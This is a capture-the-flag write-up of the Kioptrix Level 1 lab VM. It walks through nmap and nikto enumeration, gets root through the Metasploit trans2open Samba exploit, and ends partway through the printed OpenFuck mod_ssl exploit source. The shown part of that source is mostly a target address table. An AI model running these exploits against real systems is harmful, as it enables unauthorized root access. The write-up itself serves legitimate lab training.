
# 1. Challenge Overview
1. Challenge name: Kioptrix level 1
2. Discerption: This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges
3. Date release: 17 Feb 2010
4. Attempted Date: 10/5/2025
5. Solved Date: 17/5/2025
6. Category:
	1. [ ] Web
	2. [ ] Crypto
	3. [x] Pwn
	4. [ ] Reversing
	5. [ ] Forensics
7. Operating System:
	1. [x] Linux
	2. [ ] Windows
8. Difficulty Level:
	1. [x] Easy
	2. [ ] Medium
	3. [ ] Hard
9. Goal:
	1. [ ] Flag
	2. [x] root
10. Setup:
	1. download the machine from reputable sources to avoid malicious files: [vulnhub](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)
	2. Extract the Virtual Machine Files: it contains .vmdk (virtual disk) file and a .vmx (virtual machine configuration) file
	3. Import the Virtual Machine into VMware Workstation:
		1. Go to "File" > "Open..."
		2. Navigate to the folder where you extracted the Kioptrix Level 1 files
		3. Select the .vmx file and click "Open."
	4. Configure Network Settings Depends On Your Needs:
		1. Host-Only Networking (Recommended for isolated testing)
		2. NAT
		3. Bridged Networking (Not recommended for isolated testing)
	5. start the machine

- in my case I'm going to use Bridge because my attacker and victim machine are separated physically and my network is already isolated from the internet so bridge is fine for me
- default username and password is: root/root
# 2. The Method

## 1. Pre-Exploit:
### 1. Recon:
Before we start to do our scans we need to discover the IP of our target so I'm going to use Netdiscover

``` bash
netdiscover -r 192.168.1.0/24
```

1. **-r**: to scan range of IPs

Here are the results that back to us

``` bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 8 Captured ARP Req/Rep packets, from 6 hosts.   Total size: 480               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.1     bc:25:e0:8a:21:bc      2     120  HUAWEI TECHNOLOGIES CO.,LTD 
 192.168.1.6     78:e4:00:bf:86:aa      1      60  Hon Hai Precision Ind. Co.,L
 192.168.1.2     ea:93:80:97:ee:34      1      60  Unknown vendor              
 192.168.1.101   00:c0:ca:28:fc:57      1      60  ALFA, INC.                  
 192.168.1.103   78:e4:00:bf:86:aa      2     120  Hon Hai Precision Ind. Co.,L
 192.168.1.100   dc:a2:66:62:6a:b5      1      60  Hon Hai Precision Ind. Co.,L


```

Our target is: `192.168.1.6`

After we discovered the target let us start to preform nmap scan for the target I'm going to start with initial nmap scan

 1. initial nmap scan:

``` bash
nmap -sC -sV -O -oA nmap-output-initial 192.168.1.6
```

1. **-sC**: run default nmap scripts
2. **-sV**: detect service version
3. **-O**: detect OS
4. **-oA**: output all formats and store in file _nmap-output-initial_

 Here are the result of the initial nmap scan:

``` bash
Nmap 7.95 scan initiated Mon Mar 17 22:10:54 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -O -oA namp-output-initial 192.168.1.6
Nmap scan report for 192.168.1.6
Host is up (0.042s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32776/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2025-03-18T00:11:03+00:00; +4h59m46s from scanner time.
|_http-title: 400 Bad Request
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 78:E4:00:BF:86:AA (Hon Hai Precision Ind.)
Device type: WAP|broadband router
Running: Linux 2.4.X, Belkin embedded, Inventel embedded, Telekom embedded, USRobotics embedded, ZTE embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4 cpe:/h:belkin:f5d7633 cpe:/h:inventel:livebox cpe:/h:telekom:sinus_1054 cpe:/h:usr:sureconnect_9105 cpe:/h:zte:zxdsl_831
OS details: Belkin F5D7633, Inventel Livebox, or T-Sinus 1054 wireless broadband router; or USRobotics SureConnect 9105 or ZTE ZXDSL 831 ADSL modem
Network Distance: 1 hop

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: 4h59m45s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 17 22:11:17 2025 -- 1 IP address (1 host up) scanned in 23.18 seconds

```

So we have the following ports are opened:
1. **port 22**: running OpenSSH 2.9p2
2. **port 80 and 443**: running Apache httpd 1.3.20
3. **port 139**: running netbios-ssn Samba smbd
4. **port 111**: running rpcbind
5. **port 32768**: I do not know what is that

Before we doing our investigation for the previous open ports let us do a full nmap scan so we do not miss any other ports


2. full nmap scan:

``` bash
nmap -sC -sV -p- -oA nmap-output-full 192.168.1.6
```

1. **-sC**: run default nmap scripts
2. **-sV**: detect service version
3. **-p-**: all ports
4. **-oA**: output all formats and store in file _nmap-output-full_


We did not find anything more so now let us move to scan UDP ports

3. UDP nmap scan:

``` bash
nmap -sU -p 0-1000 -oA nmap-output-udp 192.168.1.6
```

1. **-sU**: for UDP
2. **-p-**: all ports
3. **-oA**: output all formats and store in file _nmap-output-udp_

Here are the result of the first 1000 ports nmap scan:

``` bash

└─$ nmap -sU -p 0-1000 -oA nmap-output-udp-1000 192.168.1.6
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-15 03:31 +03
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 1.86% done; ETC: 03:37 (0:06:08 remaining)
Stats: 0:02:02 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 13.92% done; ETC: 03:45 (0:12:28 remaining)
Nmap scan report for 192.168.1.6
Host is up (0.0036s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT    STATE         SERVICE
111/udp open          rpcbind
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm
775/udp open|filtered acmaint_transd
MAC Address: 78:E4:00:BF:86:AA (Hon Hai Precision Ind.)

Nmap done: 1 IP address (1 host up) scanned in 962.06 seconds

```

So we have the following ports are opened:
1. **port 111**: running rpcbind
2. **port 137**: running netbios-ns
3. **port 138 (open | filtered)**: running netbios-dmg
4. **port 775 (open | filtered)**: running acmaint_transd


Finally let us do a mental note about the nmap scan results to determine our possible entry point and arrange the ports to start with the low hanging fruit:
1. port 139: it is the easiest port to test so I'm going to start with it first
2. port 80: web is usually have a lot of things too test so it maybe can be our entry point so I will test it after port 139
3. port 22: usually do not have much things to test so it going to be the last to check

### 2. Enumeration:
#### first we are going to enumerate port 139:
first identify the version of samba using metasploit use what ever you like if you have any external script go with it no problem:
1. open metasploit: `msfconsole`
2. search for the auxiliray module: `search smb-version`
3. use the module: `use auxiliary/scanner/smb/smb_version`
4. to see the options required: `show options`
5. the only required option is the target IP: `set RHOST 192.168.1.6`
6. run the module: `run` or `exploit`

we got the version: `Unix (Samba 2.2.1a)`

now we are going to search for any vulnerabilities for that version using google and exploit-db or you can use `searchsploit` command:

I am going to use `searchsploit Samba 2.2.1a`
i found it vulnerable to a vulnerability called trans2open which is a remote buffer overflow that affect a function called trans2open (CVE-2003-0201) which accept user supplied input without checking the size of the input and there is a metasploit module to exploit it:
``` bash
searchsploit Samba 2.2.1a

Samba 2.2.8 (Linux x86) - 'trans2open' Remote Overflow (Metasploit)
```

so after enumerate port 139 we got back a valid exploit and this is maybe our entry point

now let us enumerate the rest of ports to see if we can find another entry point or not

#### enumerate port 80 /  443 

first let us navigate to the http and https version of 192.168.1.6:

http:

![[192.168.1.6 port 80 web browser.png]]

we got apache default page no thing interesting

https:

![[192.168.1.9 port 443 web .png]]

no thing interesting in the https version

let us try to find any hidden folders using `gobuster`:
``` bash
gobuster dir -u http://192.168.1.6:80 -b 404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
```

1. **-u**: your target url
2. **-b**: exclude 404 pages only 
3. **-w**: wordlist
4. **dir**: directory module

here is the result of gobuster we did not get anything useful:

``` bash
gobuster dir -u http://192.168.1.6:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.6:80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
/usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]
/mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
Progress: 94672 / 220561 (42.92%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 94762 / 220561 (42.96%)
===============================================================
Finished
===============================================================
```

now here is a thing if you remember in the nmap results we got the version of apache and the version of openssl library and mod_ssl so let us try to find if there is any vulnerabilities associated with it:
```
Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
```

for apache I didn't find any thing useful

for mod_ssl which is an apache cryptographic module that depend on openssl library and it is an old version and after a basic search in google i found it vulnerable to a buffer overflow which named openfuck (CVE-2002-0082) and there is a C exploit for it but no metasploit module for it

here is a confirmation from nikto

``` bash
nikto -h http://192.168.1.6

- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.1.6
+ Target Hostname:    192.168.1.6
+ Target Port:        80
+ Start Time:         2025-05-12 19:50:13 (GMT3)
---------------------------------------------------------------------------
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Thu Sep  6 06:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.
+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system.
+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows in mod_rewrite and mod_cgi.
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.
/usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835
+ /manual/: Directory indexing found.
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
```

let us continue

#### enumerate port 22:
if you remember we got the version of SSH in the nmap result which was `OpenSSH 2.9p2` so let us confirm it using netcat:

``` bash
nc -nv 192.168.1.6 22 

(UNKNOWN) [192.168.1.6] 22 (ssh) open
SSH-1.99-OpenSSH_2.9p2

```

indeed we got the same result back so we are now going to search for any vulnerabilities that associated with this version

i didn't find anything useful for SSH

now let's try to to login with root and no password but before that let us confirm if it use password-based authentication using namp or you can simply use `ssh root@<target>` if it prompt you to enter password so its enabled:

``` bash
nmap -p 22 --script ssh-auth-methods 192.168.1.6

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 17:36 +03
Nmap scan report for 192.168.1.6
Host is up (0.073s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|     publickey
|     password
|_    keyboard-interactive
MAC Address: 78:E4:00:BF:86:AA (Hon Hai Precision Ind.)

Nmap done: 1 IP address (1 host up) scanned in 11.23 seconds

```

and as you see its enabled so we can now try to SSH with root and no password 

and it didn't work now we can try to brute-force it but I will not go to this path now instead I'm going to exploit the samba and mod_ssl vulnerabilities and that what we are going to do in the exploit phase next

### 3. Exploit
as we saw in the pervious phase there is to possible foothold for us and I'm going try to exploit them:

#### 1. samba trans2open:
let us start up the metasploit to exploit:
1. open metasploit: `msfconsole`
2. search for the auxiliray module: `search trans2open`
3. use the module: `use exploit/linux/samba/trans2open`
4. to see the options required: `show options`
5. the only required option is the target IP: `set RHOST 192.168.1.8`
6. run the module: `run` or `exploit`

``` bash
[*] 192.168.1.9:139 - Trying return address 0xbfff9bfc...
[*] 192.168.1.9:139 - Trying return address 0xbfff9afc...
[*] 192.168.1.9:139 - Trying return address 0xbfff99fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff98fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff97fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff96fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff95fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff94fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff93fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff92fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff91fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff90fc...
[*] 192.168.1.9:139 - Trying return address 0xbfff8ffc...
[*] 192.168.1.9:139 - Trying return address 0xbfff8efc...
^C[-] 192.168.1.9:139 - Exploit failed [user-interrupt]: Interrupt 
[-] exploit: Interrupted
msf6 exploit(linux/samba/trans2open) >

```

for some reason it keep looping

I have discovered the problem I didn't open the metasploit port in the kali firewall

I got another problem but this time the payload was not set properly so you have to use the following generic payload `payload/generic/shell_reverse_tcp` 

``` bash
msf6 exploit(linux/samba/trans2open) > sessions -i 6
[*] Starting interaction with 6...

ls
whoami
root
hostname
kioptrix.level1

```

![[kioptrix rooted via samba trans2open .png]]

yay we got a root shell back :) pwned successfully through samba trans2open exploit

now let's move to the second path to root the machine

#### 2. mod_ssl openfuck:

there is no metasploit module for it but there is a 3 C exploit available on exploit-db so we are going to see which one we will use:


``` bash
searchsploit openfuck

---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow              | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)        | unix/remote/764.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)        | unix/remote/47080.c
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

Sadly none of them actually work :( for some reason it didn't compile

``` bash
  50 | OSSL_DEPRECATEDIN_3_0 int MD5_Update(MD5_CTX *c, const void *data, size_t len);
      |                           ^~~~~~~~~~
47080.c:798:17: warning: â€˜MD5_Finalâ€™ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  798 |                 MD5_Final(km,&ctx);
      |                 ^~~~~~~~~
/usr/include/openssl/md5.h:51:27: note: declared here
   51 | OSSL_DEPRECATEDIN_3_0 int MD5_Final(unsigned char *md, MD5_CTX *c);
      |                           ^~~~~~~~~
47080.c: In function â€˜generate_session_keysâ€™:
47080.c:807:9: warning: â€˜RC4_set_keyâ€™ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  807 |         RC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);
      |         ^~~~~~~~~~~
/usr/include/openssl/rc4.h:35:28: note: declared here
   35 | OSSL_DEPRECATEDIN_3_0 void RC4_set_key(RC4_KEY *key, int len,
      |                            ^~~~~~~~~~~
47080.c:811:9: warning: â€˜RC4_set_keyâ€™ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
  811 |         RC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);
      |         ^~~~~~~~~~~
/usr/include/openssl/rc4.h:35:28: note: declared here
   35 | OSSL_DEPRECATEDIN_3_0 void RC4_set_key(RC4_KEY *key, int len,
```

after a search on google I found a modified version of openfuck here is the code:

[openfuck updated github](https://github.com/heltonWernik/OpenLuck)

``` c
/*
 *
 * OF version r00t VERY PRIV8 spabam
 * Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto
 * objdump -R /usr/sbin/httpd|grep free to get more targets
 * #hackarena irc.brasnet.org
 */

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/x509.h>
#include <openssl/evp.h>

#include <openssl/rc4.h>
#include <openssl/md5.h>
#define SSL2_MT_ERROR 0
#define SSL2_MT_CLIENT_FINISHED 3
#define SSL2_MT_SERVER_HELLO 4
#define SSL2_MT_SERVER_VERIFY 5
#define SSL2_MT_SERVER_FINISHED 6
#define SSL2_MAX_CONNECTION_ID_LENGTH 16

/* update this if you add architectures */
#define MAX_ARCH 138

struct archs {
	char* desc;
	int func_addr;	/* objdump -R /usr/sbin/httpd | grep free */
} architectures[] = {

        {
                "Caldera OpenLinux (apache-1.3.26)",
                0x080920e0
        },
	{
		"Cobalt Sun 6.0 (apache-1.3.12)",
		0x8120f0c
	},
	{
		"Cobalt Sun 6.0 (apache-1.3.20)",
		0x811dcb8
	},
	{
		"Cobalt Sun x (apache-1.3.26)",
		0x8123ac3
	},
	{
		"Cobalt Sun x Fixed2 (apache-1.3.26)",
		0x81233c3
	},
	{
		"Conectiva 4 (apache-1.3.6)",
		0x08075398
	},
	{
		"Conectiva 4.1 (apache-1.3.9)",
		0x0808f2fe
	},
	{
		"Conectiva 6 (apache-1.3.14)",
		0x0809222c
	},
	{
		"Conectiva 7 (apache-1.3.12)",
		0x0808f874
	},
	{
		"Conectiva 7 (apache-1.3.19)",
		0x08088aa0
	},
	{
		"Conectiva 7/8 (apache-1.3.26)",
		0x0808e628
	},
	{
		"Conectiva 8 (apache-1.3.22)",
		0x0808b2d0
	},
	{
		"Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)",
		0x08095264
	},
	{
		"Debian GNU Linux (apache_1.3.19-1)",
		0x080966fc
	},
	{
		"Debian GNU Linux (apache_1.3.22-2)",
		0x08096aac
	},
	{
		"Debian GNU Linux (apache-1.3.22-2.1)",
		0x08083828
	},
	{
		"Debian GNU Linux (apache-1.3.22-5)",
		0x08083728
	},
	{
		"Debian GNU Linux (apache_1.3.23-1)",
		0x08085de8
	},
	{
		"Debian GNU Linux (apache_1.3.24-2.1)",
		0x08087d08
	},
        {       "Debian Linux GNU Linux 2 (apache_1.3.24-2.1)",
	        0x080873ac
	},
	{
		"Debian GNU Linux (apache_1.3.24-3)",
		0x08087d68
	},
	{
		"Debian GNU Linux (apache-1.3.26-1)",
		0x0080863c4
	},
	{
		"Debian GNU Linux 3.0 Woody (apache-1.3.26-1)",
		0x080863cc
	},
	{       "Debian GNU Linux (apache-1.3.27)",
	        0x0080866a3
	},


{ "FreeBSD (apache-1.3.9)", 0xbfbfde00 },
{ "FreeBSD (apache-1.3.11)", 0x080a2ea8 },
{ "FreeBSD (apache-1.3.12.1.40)", 0x080a7f58 },
{ "FreeBSD (apache-1.3.12.1.40)", 0x080a0ec0 },
{ "FreeBSD (apache-1.3.12.1.40)", 0x080a7e7c },
{ "FreeBSD (apache-1.3.12.1.40_1)", 0x080a7f18 },
{ "FreeBSD (apache-1.3.12)", 0x0809bd7c },
{ "FreeBSD (apache-1.3.14)", 0xbfbfdc00 },
{ "FreeBSD (apache-1.3.14)", 0x080ab68c },
{ "FreeBSD (apache-1.3.14)", 0x0808c76c },
{ "FreeBSD (apache-1.3.14)", 0x080a3fc8 },
{ "FreeBSD (apache-1.3.14)", 0x080ab6d8 },
{ "FreeBSD (apache-1.3.17_1)", 0x0808820c },
{ "FreeBSD (apache-1.3.19)", 0xbfbfdc00 },
{ "FreeBSD (apache-1.3.19_1)", 0x0808c96c },
{ "FreeBSD (apache-1.3.20)", 0x0808cb70 },
{ "FreeBSD (apache-1.3.20)", 0xbfbfc000 },
{ "FreeBSD (apache-1.3.20+2.8.4)", 0x0808faf8 },
{ "FreeBSD (apache-1.3.20_1)", 0x0808dfb4 },
{ "FreeBSD (apache-1.3.22)", 0xbfbfc000 },
{ "FreeBSD (apache-1.3.22_7)", 0x0808d110 },
{ "FreeBSD (apache_fp-1.3.23)", 0x0807c5f8 },
{ "FreeBSD (apache-1.3.24_7)", 0x0808f8b0 },
{ "FreeBSD (apache-1.3.24+2.8.8)", 0x080927f8 },
{ "FreeBSD 4.6.2-Release-p6 (apache-1.3.26)", 0x080c432c },
{ "FreeBSD 4.6-Realease (apache-1.3.26)", 0x0808fdec },
{ "FreeBSD (apache-1.3.27)", 0x080902e4 },


	{
		"Gentoo Linux (apache-1.3.24-r2)",
		0x08086c34
	},
	{
		"Linux Generic (apache-1.3.14)",
		0xbffff500
	},
	{
		"Mandrake Linux X.x (apache-1.3.22-10.1mdk)",
		0x080808ab
	},
	{
		"Mandrake Linux 7.1 (apache-1.3.14-2)",
		0x0809f6c4
	},
	{
		"Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)",
		0x0809d233
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.14-2mdk)",
		0x0809f6ef
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.14) 2",
		0x0809d6c4
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)",
		0x0809ccde
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)",
		0x0809ce14
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)",
		0x0809d262
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)",
		0x08083545
	},
	{
		"Mandrake Linux 8.0 (apache-1.3.19-3)",
		0x0809ea98
	},
	{
		"Mandrake Linux 8.1 (apache-1.3.20-3)",
		0x0809e97c
	},
	{
		"Mandrake Linux 8.2 (apache-1.3.23-4)",
		0x08086580
	},
	{       "Mandrake Linux 8.2 #2 (apache-1.3.23-4)",
	        0x08086484
	},
	{       "Mandrake Linux 8.2 (apache-1.3.24)",
	        0x08086665
	},

	{       "Mandrake Linux 9 (apache-1.3.26)",
	        0x0808b864
	},
	{
		"RedHat Linux ?.? GENERIC (apache-1.3.12-1)",
		0x0808c0f4
	},
	{
		"RedHat Linux TEST1 (apache-1.3.12-1)",
		0x0808c0f4
	},
	{
		"RedHat Linux TEST2 (apache-1.3.12-1)",
		0x0808c0f4
	},
	{
		"RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)",
		0x080d2c35
	},
	{
		"RedHat Linux 4.2 (apache-1.1.3-3)",
		0x08065bae
	},
	{
		"RedHat Linux 5.0 (apache-1.2.4-4)",
		0x0808c82c
	},
	{
		"RedHat Linux 5.1-Update (apache-1.2.6)",
		0x08092a45
	},
	{
		"RedHat Linux 5.1 (apache-1.2.6-4)",
		0x08092c2d
	},
	{
		"RedHat Linux 5.2 (apache-1.3.3-1)",
		0x0806f049
	},
	{
		"RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)",
		0x0808e4d8
	},
	{
		"RedHat Linux 6.0 (apache-1.3.6-7)",
		0x080707ec
	},
	{
		"RedHat Linux 6.0 (apache-1.3.6-7)",
		0x080707f9
	},
	{
		"RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)",
		0x0808fd52
	},
	{
		"RedHat Linux 6.0 Update (apache-1.3.24)",
		0x80acd58
	},
	{
		"RedHat Linux 6.1 (apache-1.3.9-4)1",
		0x0808ccc4
	},
	{
		"RedHat Linux 6.1 (apache-1.3.9-4)2",
		0x0808ccdc
	},
	{
		"RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)",
		0x0808fd5d
	},
	{
		"RedHat Linux 6.1-fp2000 (apache-1.3.26)",
		0x082e6fcd
	},
	{
		"RedHat Linux 6.2 (apache-1.3.12-2)1",
		0x0808f689
	},
	{
		"RedHat Linux 6.2 (apache-1.3.12-2)2",
		0x0808f614
	},
	{
		"RedHat Linux 6.2 mod(apache-1.3.12-2)3",
		0xbffff94c
	},

	{
		"RedHat Linux 6.2 update (apache-1.3.22-5.6)1",
		0x0808f9ec
	},
	{
		"RedHat Linux 6.2-Update (apache-1.3.22-5.6)2",
		0x0808f9d4
	},
	{
		"Redhat Linux 7.x (apache-1.3.22)",
		0x0808400c
	},
	{
		"RedHat Linux 7.x (apache-1.3.26-1)",
		0x080873bc
	},
	{       "RedHat Linux 7.x (apache-1.3.27)",
	        0x08087221
	},
	{
		"RedHat Linux 7.0 (apache-1.3.12-25)1",
		0x0809251c
	},
	{
		"RedHat Linux 7.0 (apache-1.3.12-25)2",
		0x0809252d
	},
	{
		"RedHat Linux 7.0 (apache-1.3.14-2)",
		0x08092b98
	},
        {
		"RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)",
		0x08084358
	},
	{
		"RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)",
		0x0808438c
	},
	{
		"RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)",
		0x08086e41
	},
	{
		"RedHat Linux 7.1 (apache-1.3.19-5)1",
		0x0809af8c
	},
	{
		"RedHat Linux 7.1 (apache-1.3.19-5)2",
		0x0809afd9
	},
	{
		"RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)",
		0x0808438c
	},
	{
		"RedHat Linux 7.1-Update (1.3.22-5.7.1)",
		0x08084389
	},
        {
		"RedHat Linux 7.1 (apache-1.3.22-src)",
	        0x0816021c
        },
        {
		"RedHat Linux 7.1-Update (1.3.27-1.7.1)",
		0x08086ec89
	},
	{
		"RedHat Linux 7.2 (apache-1.3.20-16)1",
		0x080994e5
	},
	{
		"RedHat Linux 7.2 (apache-1.3.20-16)2",
		0x080994d4
	},
	{
		"RedHat Linux 7.2-Update (apache-1.3.22-6)",
		0x08084045
	},
	{
		"RedHat Linux 7.2 (apache-1.3.24)",
		0x80b0938
	},
	{
		"RedHat Linux 7.2 (apache-1.3.26)",
		0x08161c16
	},
	{
		"RedHat Linux 7.2 (apache-1.3.26-snc)",
		0x8161c14
	},
	{

		"Redhat Linux 7.2 (apache-1.3.26 w/PHP)1",
		0x08269950
	},
	{
		"Redhat Linux 7.2 (apache-1.3.26 w/PHP)2",
		0x08269988
	},
	{
		"RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)",
		0x08086af9
	},
	{
		"RedHat Linux 7.3 (apache-1.3.23-11)1",
		0x0808528c
	},
	{
		"RedHat Linux 7.3 (apache-1.3.23-11)2",
		0x0808525f
	},
	{
		"RedHat Linux 7.3 (apache-1.3.27)",
		0x080862e4
	},
	{       "RedHat Linux 8.0 (apache-1.3.27)",
	        0x08084c1c
        },
        {       "RedHat Linux 8.0-second (apache-1.3.27)",
                0x0808151e
        },
